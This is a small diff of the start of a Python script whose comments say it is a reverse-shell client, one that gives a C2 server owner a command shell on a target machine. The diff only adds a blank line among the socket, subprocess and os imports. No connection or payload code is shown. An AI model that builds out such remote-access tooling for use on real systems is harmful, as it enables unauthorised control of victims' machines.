@@ -2,6 +2,7 @@
 
 import socket
 import subprocess # libray which enables us to use trgt OS command in C2 server
+
 import os # library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 
 # The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network. 
